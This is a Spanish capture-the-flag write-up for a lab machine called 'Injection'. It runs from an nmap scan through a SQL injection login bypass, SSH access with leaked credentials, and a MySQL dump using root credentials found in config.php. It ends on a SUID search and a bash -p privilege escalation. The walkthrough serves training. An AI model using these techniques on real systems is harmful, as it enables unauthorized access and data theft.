Nombre de la máquina: Injection
Dificultad: Muy fácil 
Tiempo: 1 hora


Empezamos con un escaneo normal:

`
nmap 172.17.0.3
`

En el que obtenemos como respuesta que los puertos 22/TCP y 80/TCP están abiertos. 

Al tener esta información, podemos ser ya un poco más especificos e intentar obtener más datos que nos puedan ayudar:

`
nmap 172.17.0.3 -sV -p 22,80
`

Obtenemos como respuesta:
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))


Como en el puerto 80/TCP está corriendo una página web, probaremos a poner en nuestro navegador 172.17.0.3 para ver que tipo de página es. 
La web que está alojando Apache es una página de login, como la máquina se llama Injection, suponemos que será algo relacionado con SQLInjection y probaremos a introducir en el campo del nombre " admin' or 1=1; " y la contraseña cualquier cosa. 

Con eso hemos conseguido acceder y visualizar el siguiente mensaje:

`Bienvenido Dylan! Has insertado correctamente tu contraseña: KJSDFG789FGSDF78`

Tenemos un nombre de usuario (Dylan) y un código (KJSDFG789FGSDF78) que puede ser una contraseña. Probamos a conectarnos por ssh con esas credenciales:

`
ssh dylan@172.17.0.3 
` 

El acceso fue exitoso. Ya estamos dentro de la máquina. Con sudo -l obtuve una respuesta de que el comando no existía asi que no se me ocurría una forma de poder escalar privilegios, estuve explorando las carpetas de ssh y tampoco encontré nada. Sin embargo, en las carpetas del servidor web, /var/www/html haciendo un cat del archivo config.php:


return [
        'db' => [
                'host' => 'localhost',
                'user' => 'root',
                'passwd' => 'paso',
                'dbname' => 'register',
                'options' => [
                        PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION
                ]
        ]
];



Intentaremos conectarnos con mysql utilizando esas credenciales:
`
mysql -u root -ppaso
`

Hacemos un:
`
show databases;
 use register;
 select * from users;
 ` 
Aunque ya sabemos que existe una base de datos llamada register, pues aparece en config.php, obtenemos:
`
+----------+------------------+
| username | passwd           |
+----------+------------------+
| dylan    | KJSDFG789FGSDF78 |
+----------+------------------+
` 

Era información que ya teniamos, pero probaremos lo siguiente:
`
INSERT INTO users VALUES ('prueba','123456');
INSERT INTO users VALUES ('prueba','123456');
DELETE FROM users WHERE username='prueba1';
`
Todas las consultas fueron exitosas, por lo que podemos decir que tenemos control sobre esa base de datos, pues podemos crear y eliminar los que queramos. Al igual que hacer un:
`
mysqldump --databases register -u root -ppaso > datos.sql
`
Para obtener los datos.

Aunque aún no fuimos capaces de escalar privilegios en la máquina. 


`find / -perm -4000 -user root 2>/dev/null`

`/usr/bin/env /bin/bash -p`











